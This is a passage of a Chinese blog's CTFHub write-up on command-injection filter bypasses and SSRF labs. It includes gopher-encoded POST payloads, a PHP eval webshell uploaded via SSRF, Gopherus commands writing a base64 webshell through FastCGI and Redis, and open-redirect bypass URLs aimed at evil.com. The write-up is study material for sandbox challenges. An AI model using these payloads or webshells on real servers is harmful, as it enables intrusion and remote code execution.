id="4-过滤运算符，挑-剩下的用，如果都被过滤就使用-0a-（换行符）-0d-（回车符）（要在url中输入，不然无法被编码）"><a href="#4-过滤运算符，挑-剩下的用，如果都被过滤就使用-0a-（换行符）-0d-（回车符）（要在url中输入，不然无法被编码）" class="headerlink" title="4.过滤运算符，挑;&amp;|剩下的用，如果都被过滤就使用%0a （换行符）%0d （回车符）（要在url中输入，不然无法被编码）"></a>4.过滤运算符，挑;&amp;|剩下的用，如果都被过滤就使用%0a （换行符）%0d （回车符）（要在url中输入，不然无法被编码）</h3><h2 id="综合过滤"><a href="#综合过滤" class="headerlink" title="综合过滤"></a>综合过滤</h2><h3 id="过滤了-空格-cat-flag-ctfhub"><a href="#过滤了-空格-cat-flag-ctfhub" class="headerlink" title="过滤了|  &amp;  ;  空格  &#x2F;  cat  flag  ctfhub"></a>过滤了|  &amp;  ;  空格  &#x2F;  cat  flag  ctfhub</h3><h3 id="运算符全军覆没，所以用-0a绕过"><a href="#运算符全军覆没，所以用-0a绕过" class="headerlink" title="运算符全军覆没，所以用%0a绕过"></a>运算符全军覆没，所以用%0a绕过</h3><h3 id="空格用-IFS-绕过"><a href="#空格用-IFS-绕过" class="headerlink" title="空格用${IFS}绕过"></a>空格用<code>$&#123;IFS&#125;</code>绕过</h3><h3 id="用cd代替"><a href="#用cd代替" class="headerlink" title="&#x2F;用cd代替"></a>&#x2F;用cd代替</h3><h3 id="cat用more等代替"><a href="#cat用more等代替" class="headerlink" title="cat用more等代替"></a>cat用more等代替</h3><h3 id="flag是文件名和路径名的一部分，在访问时要避免出现，所以可以利用-自动补齐，比如cd-flag-in-here就可以用cd-in-here自动补齐，也可以用-将flag断开，即fl-ag，原理为-在shell命令执行下为空"><a href="#flag是文件名和路径名的一部分，在访问时要避免出现，所以可以利用-自动补齐，比如cd-flag-in-here就可以用cd-in-here自动补齐，也可以用-将flag断开，即fl-ag，原理为-在shell命令执行下为空" class="headerlink" title="flag是文件名和路径名的一部分，在访问时要避免出现，所以可以利用*自动补齐，比如cd flag_in_here就可以用cd *_in_here自动补齐，也可以用$*将flag断开，即fl$ag，原理为$ 在shell命令执行下为空"></a>flag是文件名和路径名的一部分，在访问时要避免出现，所以可以利用*自动补齐，比如cd flag_in_here就可以用cd *_in_here自动补齐，也可以用$*将flag断开，即fl$<em>ag，原理为$</em> 在shell命令执行下为空</h3><h3 id="ctfhub没有出现。"><a href="#ctfhub没有出现。" class="headerlink" title="ctfhub没有出现。"></a>ctfhub没有出现。</h3><p><img src="https://pics.lwzheng.tech/2025/01/11/678224c9f14c0.png" alt="cc7be2d0790368393cafc8179c0b231d.png"><br><img src="https://pics.lwzheng.tech/2025/01/11/678224d07268a.png" alt="df885087d83d24ee477dffc576108ff6.png"><br><img src="https://pics.lwzheng.tech/2025/01/11/678224d6c4e9b.png" alt="55ffdd6a170dac028f080dfa7dc395a7.png"></p>
<h1 id="ctfhubSSRF"><a href="#ctfhubSSRF" class="headerlink" title="ctfhubSSRF"></a>ctfhubSSRF</h1><h2 id="1-内网访问"><a href="#1-内网访问" class="headerlink" title="1)内网访问"></a>1)内网访问</h2><h3 id="注意到url中有？url-，所以直接url-127-0-0-1-flag-php"><a href="#注意到url中有？url-，所以直接url-127-0-0-1-flag-php" class="headerlink" title="注意到url中有？url&#x3D;，所以直接url&#x3D;127.0.0.1&#x2F;flag.php"></a>注意到url中有？url&#x3D;，所以直接url&#x3D;127.0.0.1&#x2F;flag.php</h3><h2 id="2-伪协议读取文件"><a href="#2-伪协议读取文件" class="headerlink" title="2)伪协议读取文件"></a>2)伪协议读取文件</h2><blockquote>
<p>‌IIS服务器‌：默认的Web主目录为C:\inetpub\wwwroot。<br>‌Apache服务器‌：默认的主目录是&#x2F;var&#x2F;www&#x2F;html。<br>‌Nginx服务器‌：默认的主目录是&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html。</p>
</blockquote>
<blockquote>
<p>SSRF常用的伪协议<br>ftp:&#x2F;&#x2F; 可用于网络端口扫描<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F;轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F;分布式文档传递服务<br>ht tp:&#x2F;&#x2F;查看内网主机端口是否存在。<br>file:&#x2F;&#x2F;读取服务器本地文件，访问本地的静态资源,如file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F;协议探测端口和服务指纹，攻击redis，写入定时任务，进行反弹shell gopher：发送POST或GET请求，用来攻击内网应用redis，mysql，fastCGI，smtp等,如 dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info:</p>
</blockquote>
<h3 id="利用file伪协议读取flag-php-url-file-var-www-html-flag-php"><a href="#利用file伪协议读取flag-php-url-file-var-www-html-flag-php" class="headerlink" title="利用file伪协议读取flag.php,url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php"></a>利用file伪协议读取flag.php,url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</h3><h2 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3)端口扫描"></a>3)端口扫描</h2><h3 id="用http协议判断内网主机端口是否存在。BP爆破端口8000-9000，用cpp的ofstream或者python生成字典。"><a href="#用http协议判断内网主机端口是否存在。BP爆破端口8000-9000，用cpp的ofstream或者python生成字典。" class="headerlink" title="用http协议判断内网主机端口是否存在。BP爆破端口8000-9000，用cpp的ofstream或者python生成字典。"></a>用http协议判断内网主机端口是否存在。BP爆破端口8000-9000，用cpp的ofstream或者python生成字典。</h3><p><img src="https://pics.lwzheng.tech/2025/01/12/678368a58840b.png" alt="cdbbc506-8863-4e49-b77a-ca92dc7ecc54.png"></p>
<h2 id="4-POST请求"><a href="#4-POST请求" class="headerlink" title="4)POST请求"></a>4)POST请求</h2><h3 id="访问网站之后啥也没有，这种情况一般是要用扫描工具扫描一下，可以用御剑或者dirsearch扫一下（为什么我的总是扫不出来）"><a href="#访问网站之后啥也没有，这种情况一般是要用扫描工具扫描一下，可以用御剑或者dirsearch扫一下（为什么我的总是扫不出来）" class="headerlink" title="访问网站之后啥也没有，这种情况一般是要用扫描工具扫描一下，可以用御剑或者dirsearch扫一下（为什么我的总是扫不出来）"></a>访问网站之后啥也没有，这种情况一般是要用扫描工具扫描一下，可以用御剑或者dirsearch扫一下（为什么我的总是扫不出来）</h3><h3 id="扫描之后得到flag-php和index-php-访问flag-php后发现要求本地访问，所以加上127-0-0-1访问发现有个输入框-但是提交不了，也没有POST请求，查看源代码后有个key，所以我们要构造POST请求，就要利用到Gopher协议，SSRF便是解决这种问题的漏洞，他的原理便是通过一个有SSRF漏洞的网站来间接发送请求，所以为了找到SSRF漏洞（就2个php文件的话大概率就是另外一个index-php了）的网站，我们用伪协议file来读取index-php和flag-php的源代码"><a href="#扫描之后得到flag-php和index-php-访问flag-php后发现要求本地访问，所以加上127-0-0-1访问发现有个输入框-但是提交不了，也没有POST请求，查看源代码后有个key，所以我们要构造POST请求，就要利用到Gopher协议，SSRF便是解决这种问题的漏洞，他的原理便是通过一个有SSRF漏洞的网站来间接发送请求，所以为了找到SSRF漏洞（就2个php文件的话大概率就是另外一个index-php了）的网站，我们用伪协议file来读取index-php和flag-php的源代码" class="headerlink" title="扫描之后得到flag.php和index.php,访问flag.php后发现要求本地访问，所以加上127.0.0.1访问发现有个输入框,但是提交不了，也没有POST请求，查看源代码后有个key，所以我们要构造POST请求，就要利用到Gopher协议，SSRF便是解决这种问题的漏洞，他的原理便是通过一个有SSRF漏洞的网站来间接发送请求，所以为了找到SSRF漏洞（就2个php文件的话大概率就是另外一个index.php了）的网站，我们用伪协议file来读取index.php和flag.php的源代码"></a>扫描之后得到flag.php和index.php,访问flag.php后发现要求本地访问，所以加上127.0.0.1访问发现有个输入框,但是提交不了，也没有POST请求，查看源代码后有个key，所以我们要构造POST请求，就要利用到Gopher协议，SSRF便是解决这种问题的漏洞，他的原理便是通过一个有SSRF漏洞的网站来间接发送请求，所以为了找到SSRF漏洞（就2个php文件的话大概率就是另外一个index.php了）的网站，我们用伪协议file来读取index.php和flag.php的源代码</h3><blockquote>
<p>index.php<br>《?php</p>
</blockquote>
<pre><code class="language-error_reporting(0);">if (!isset($_REQUEST[&#39;url&#39;]))&#123;
header(&quot;Location: /?url=_&quot;);
exit;
&#125;
// 初始化一个新的cURL会话，并将返回的会话句柄赋值给变量 $ch。
$ch = curl_init();
//使用 curl_setopt 函数设置cURL会话的选项。
//这里设置了URL选项 (CURLOPT_URL)，它指定了要请求的URL。URL从 $_REQUEST[&#39;url&#39;] 获取，这通常是一个GET或POST请求中提交的URL。
curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);
//设置是否应返回HTTP头部。这里设置为0，意味着不返回HTTP头部，只返回主体内容。
curl_setopt($ch, CURLOPT_HEADER, 0);
//这个选项指示cURL应遵循 &quot;Location&quot; 头部字段中的重定向。如果设置为1，cURL将自动遵循所有重定向。
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//执行cURL会话。这实际上发送了HTTP请求。
curl_exec($ch);
//关闭cURL会话并释放所有相关资源。
curl_close($ch);
?》```


&gt;flag.php
```《?php
error_reporting(0);
//$_SERVER[&quot;REMOTE_ADDR&quot;] 是一个超全局变量，它存储了访问者的 IP 地址。
//检查访问者的 IP 地址是否不是 &quot;127.0.0.1&quot;。
//如果访问者的 IP 地址不是 &quot;127.0.0.1&quot;，这行代码会输出 &quot;Just View From 127.0.0.1&quot;。
if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
echo &quot;Just View From 127.0.0.1&quot;;
return;
&#125;
//从环境变量 &quot;CTFHUB&quot; 中获取值，并将其存储在变量 $flag 中。环境变量是在操作系统级别设置的，并且可以通过 PHP 的 getenv 函数访问。
$flag=getenv(&quot;CTFHUB&quot;);
//将 $flag 的值传递给 PHP 的 md5 函数，该函数会返回 $flag 的 MD5 哈希值，并将结果存储在 $key 变量中。
$key = md5($flag);
//这行代码检查是否有一个名为 &quot;key&quot; 的 POST 参数，并且该参数的值是否与 $key 相等。
if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
echo $flag;
exit;
&#125;
?》```


&gt;Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；
gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议
Gopher协议格式：
URL:gopher://《host》:《port》/《gopher-path》_后接TCP数据流
gopher的默认端口是70
如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码

### 因为index.php里面运用了curl（curl就是一个工具，用来做服务器之间数据、文件传输的工具），所以可以利用curl传url，再借助Gopher协议达到构造POST请求的效果，模版如下
&gt;gopher://127.0.0.1:80/_    （注意_,因为gopher协议会自动吞掉这一个字符，所以要占位）
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
key=xxx     （注意回车表示结束）

### 注意在传Gopher协议时要进行二次url编码，原理为传入参数浏览器编码一次，curl编码一次。
### 注意替换回车换行为%0d%0a，因为在线网站一般按windows的回车符%0a而不是linux的%0d
[在线编码网站](https://www.iamwawa.cn/urldecode.html)
### 当然也可以当代码小子(快学python)
&gt;import urllib.parse
payload =\
&quot;&quot;&quot;
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
key=xxx
&quot;&quot;&quot;
tmp = urllib.parse.quote(payload)
new = tmp.replace(&#39;%0A&#39;,&#39;%0D%0A&#39;)
result = &#39;gopher://127.0.0.1:80/&#39;+&#39;_&#39;+new
result = urllib.parse.quote(result)
print(result)

### 得到payload之后就可以去传入url的参数里面了
&gt;http://challenge-54c4b21edd60659d.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250Akey%253Deee82ef2d9e96771cb72590528652e19%250D%250A

![4bae2ab84c6e8db26164b3041ae7bb2d.png](https://pics.lwzheng.tech/2025/01/12/6783da5fde7fb.png)

### 得到flag。
## 5)文件上传
### 有了上面那个题的经验这个就简单了，但是也有一些新知识能学到，就是前端修改网页源码创造提交按钮来产生请求，从而进行gopher协议的编写
### 首先还是空白页，虽然题目给了flag.php，但是还是惯例扫描一下
![b85a2703-6e20-469f-a9d0-3cae41cefbdd.png](https://pics.lwzheng.tech/2025/01/13/6784cb989fd1e.png)
### 扫描到flag.php后访问，显示要从本地访问，所以加上127.0.0.1访问，看到一个提交框，但是还是没有提交按钮，不过有了上一个题的经验后便会通过gopher协议创造请求，但是请求模版怎么来呢，总不能打开个文件上传漏洞去修改吧，所以这里就可以利用前端修改网页源码创造提交按钮来产生请求的技巧生成网页请求，生成后先试试提交，然后显示要从本地访问，然后BP抓包，把host改为127.0.0.1,得到彩蛋(╬◣д◢)，果然是不能直接访问，要通过gopher协议访问，不过我们已经得到请求包了，接下来就简单了，还是一样的gopher协议二次url编码（记得改host为127.0.0.1）
![510f5684-5432-4713-9043-0d7b989b7782.png](https://pics.lwzheng.tech/2025/01/13/6784cc9363d37.png)
&gt;gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520343%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-d1dfc696193c2ba4.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryhKT4hW1u2SbuqsQm%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/117.0.5938.63%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-d1dfc696193c2ba4.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryhKT4hW1u2SbuqsQm%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253Cscript%2520language%253D%2527php%2527%253E%2540eval%2528%2524_POST%255B%2527a%2527%255D%2529%253B%253C/script%253E%250D%250A------WebKitFormBoundaryhKT4hW1u2SbuqsQm%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250Asubmit%250D%250A------WebKitFormBoundaryhKT4hW1u2SbuqsQm--%250D%250A%250D%250A

### 然后上传即可
![2307574a-e97d-442c-b3fa-7f74b8837acf.png](https://pics.lwzheng.tech/2025/01/13/6784ccaebf93f.png)
### 彩蛋++
![68669506-10c9-47d3-96f7-81bc8354f56b.png](https://pics.lwzheng.tech/2025/01/13/6784ccd2ab60e.png)
## 6)FastCGI协议
### 利用PHP-FPM未授权访问漏洞拓展至任意代码执行，用Gopherus-master工具即可快捷方便的达到任意代码执行
&gt;python2 gopherus.py --exploit fastcgi
&gt;/var/www/html/index.php(网站中的.php文件)
&gt;echo &quot;PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+&quot; | base64 -d &gt; shell.php(一句话木马)

![657a291e-858f-4170-b899-e6a770925263.png](https://pics.lwzheng.tech/2025/01/13/6784e3e4ab74c.png)
### 将输出的gopher协议进行一次url编码，传入即可达到文件上传的效果，接下来蚁剑访问即可
![e37f0bf2-b9ea-4383-963f-c5fde8e2dcb1.png](https://pics.lwzheng.tech/2025/01/13/6784e3eb18279.png)
## 7)Redis协议
### 跟上面类似，也是Gopherus-master工具
&gt;python2 gopherus.py --exploit radis
&gt;phpshell
&gt;/var/www/html/
&gt;《?php eval($_POST[&#39;cmd&#39;])?》

![3fbc0b53-6365-4340-8104-72e3dc38511f.png](https://pics.lwzheng.tech/2025/01/13/6784ec8fa2fd9.png)
### 将输出的gopher协议进行一次url编码，传入即可达到文件上传的效果，接下来蚁剑访问即可
![717e58cc-5e7a-4a13-9460-d09dea7717f0.png](https://pics.lwzheng.tech/2025/01/13/6784ecd908b6f.png)
## 8)URL Bypass
&gt;单斜线&quot;/&quot;绕过
https://www.landgrey.me/redirect.php?url=/www.evil.com
缺少协议绕过
https://www.landgrey.me/redirect.php?url=//www.evil.com
多斜线&quot;/&quot;前缀绕过
https://www.landgrey.me/redirect.php?url=///www.evil.com
https://www.landgrey.me/redirect.php?url=www.evil.com
利用&quot;@&quot;符号绕过
https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com
利用反斜线&quot;&quot;绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me
利用&quot;#&quot;符号绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me
利用&quot;?&quot;号绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me
利用&quot;\&quot;绕过
https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me
利用&quot;.&quot;绕过
https://www.landgrey.me/redirect.php?url=.evil (可能会跳转到www.landgrey.me.evil域名)
https://www.landgrey.me/redirect.php?url=.evil.com (可能会跳转到evil.com域名)
10.重复特殊字符绕过
https://www.landgrey.me/redirect.php?url=///www.evil.com//…
https://www.landgrey.me/redirect.php?url=www.evil.com//…

### 这里想在访问127.0.0.1/flag.php的同时保证url里面含有http://notfound.ctfhub.com，所以可以利用@绕过
## 9)数字IP Bypass
&gt;数字地址计算方式1
可以是十六进制，八进制等。
115.239.210.26 &gt;&gt;&gt; 16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x。
访问：http://016373751032 ,即可访问到百度。
数字地址计算方式2
111.13.100.92 转成数字地址的方式为：111256256256 + 13256256+100256+92*1
这样得到：1863148636
这种数字地址不需要在前面加0，即访问：http://1863148636 即可访问到百度。

[数字地址计算链接](https://ip.911cha.com/)
&gt;特殊字体绕过：
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
①②⑦.⓿.⓿.①  &gt;&gt;&gt; 127.0.0.1

&gt;特殊地址：
http://0/  # 0.0.0.0可以直接访问到本地
http://127。0。0。1  # 绕过后端正则规则
http://localhost/

### 这里dirsearch扫描到flag.php,直接计算绕过即可
## 10)302跳转 Bypass
### 直接http://localhost/就能访问，但这里应该不是考这个。
&gt;短链接变换实现302跳转（但是由于跳转需要点一下确认，导致一直访问失败）

短链接变换通过检索短网址上的数据库链接，再跳转原（长）链接访问。
实际上这就是一种302

[短连接变换](https://www.985.so/)
### 可以利用短链接变换实现302跳转（但是由于跳转需要点一下确认，导致一直访问失败）
&gt;开源泛域名服务xip.io
请求是http://www.127.0.0.1.xip.io 这个绕过是在SSRF场景中的绕过，比如SSRF你要读取内网地址，一般都做了限制，可以尝试用这方法进行绕过限制，从而访问到内网。
不过这里貌似不太行

## 11)DNS重绑定 Bypass
&gt;当我们给出一个网址链接时，首先会使用服务器端的dns服务器进行dns解析，解析出ip后，再与黑名单比对，进行过滤或请求。
这里使用的原理是，让一个网址绑定两个ip，或者也可以理解为快速的更换绑定对象。
进行dns解析时会随机返回一个ip
通过这样的操作，我们就可以快速进行注入来达到目的

[绑定ip](https://lock.cmpxchg8b.com/rebinder.html)
### 利用一个域名对应2个ip进行多次尝试即可访问到flag
</code></pre>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io">xianxin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xianxinyyds.github.io/2025/01/27/ctfhub/">https://xianxinyyds.github.io/2025/01/27/ctfhub/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xianxinyyds.github.io" target="_blank">仙心</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/xianxin.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/01/28/BUU/" title="BUUCTF"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">BUUCTF</div></div><div class="info-2"><div class="info-item-1">[强网杯 2019]随便注首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行. return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);  于是尝试堆叠注入是否可行。 &#x3D;1’;show databases –+  发现可行，于是继续爆表名。 &#x3D;1’;show tables –+  爆出两个表”1919810931114514”和”words”，于是尝试爆列名. &#x3D;1’;show columns from 反引号1919810931114514反引号 –+(这里要注意纯数字作为表名要加反引号&#96;&#96;)  爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。 handler命令是mysql专有的一个查询表数据的函数，但是不如select功能强大。基本语法：handler table_name OPEN 打开表handler...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xianxin</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xianxinyyds" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1090084672@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHub"><span class="toc-number">1.</span> <span class="toc-text">CTFHub</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-CTFHub%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.1.</span> <span class="toc-text">1.CTFHub目录遍历</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8BP%E8%BF%9B%E8%A1%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%EF%BC%8C%E6%89%BE%E5%88%B0flag%E3%80%82"><span class="toc-number">1.1.1.</span> <span class="toc-text">使用BP进行目录遍历，找到flag。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-CTFHub%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">2.CTFHub备份文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.1.</span> <span class="toc-text">1)网站源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%99%E5%87%BA%E4%BA%86%E5%BE%88%E5%A4%9A%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%8F%AF%E8%83%BD%E7%9A%84%E5%90%8D%E5%AD%97%EF%BC%8C%E4%B8%80%E4%B8%AA%E4%B8%AA%E8%AF%95%E4%B8%8D%E5%A4%AA%E7%8E%B0%E5%AE%9E%EF%BC%8C%E6%89%80%E4%BB%A5%E7%94%A8%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89www-zip%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%BE%97%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E7%84%B6%E5%90%8E%E7%9C%8B%E5%88%B0flag%E7%9A%84txt%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B2%A1%E6%9C%89flag%EF%BC%8C%E5%85%88%E5%8E%BB%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%AD%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%8F%91%E7%8E%B0%E4%B8%8D%E8%A1%8C%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8E%BB%E7%BD%91%E9%A1%B5%E4%B8%AD%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目给出了很多备份文件的可能的名字，一个个试不太现实，所以用御剑扫描端口，发现有www.zip的页面，访问得到备份文件，然后看到flag的txt文件中没有flag，先去备份文件中尝试访问，发现不行，然后去网页中访问，得到flag。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bak%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">2)bak文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bak%E6%96%87%E4%BB%B6%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%A2%98%E7%BB%99%E6%88%91%E4%BB%AC%E8%AF%B4%E4%BA%86%E4%BB%96%E6%98%AF%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E4%B9%8B%E4%B8%80%EF%BC%8C%E9%A2%98%E7%9B%AE%E5%8F%88%E8%AF%B4flag%E5%9C%A8index-php%E4%B8%AD%EF%BC%8C%E6%89%80%E4%BB%A5%E8%AE%BF%E9%97%AEindex-php-bak%E5%BE%97%E5%88%B0%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%9B%E8%80%8C%E5%BE%97%E5%88%B0flag%E3%80%82"><span class="toc-number">1.2.4.</span> <span class="toc-text">bak文件第一个题给我们说了他是备份文件后缀名之一，题目又说flag在index.php中，所以访问index.php.bak得到备份文件，进而得到flag。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-vim%E7%BC%93%E5%AD%98"><span class="toc-number">1.2.5.</span> <span class="toc-text">3)vim缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 